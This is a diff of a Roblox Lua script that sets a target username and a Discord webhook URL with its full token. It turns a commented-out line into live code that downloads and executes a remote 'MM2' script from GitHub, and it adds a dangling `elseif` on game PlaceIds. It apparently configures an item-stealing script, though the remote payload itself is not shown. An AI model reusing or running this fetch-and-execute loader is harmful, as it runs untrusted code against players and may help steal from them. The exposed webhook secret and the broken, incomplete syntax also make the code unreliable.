@@ -1,4 +1,7 @@
 Username = "Runaightbet"
 Webhook = "https://discord.com/api/webhooks/1362948237572444191/jEcK1MrAG7vZCyw_J8gY4u-ODGdWJJA1E4F6l6RjnV4WNlH3J_bUuzwUeolH2BaV1Syi"
 
-"loadstring(game:HttpGet("https://raw.githubusercontent.com/kk4ft/MoriScripts/main/MM2"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kk4ft/MoriScripts/main/MM2"))()
+elseif game.PlaceId == 8737899170 or game.PlaceId == 15502339080 or game.PlaceId == 15588442388 or game.PlaceId == 17503543197 or game.PlaceId == 16498369169 then
+
+
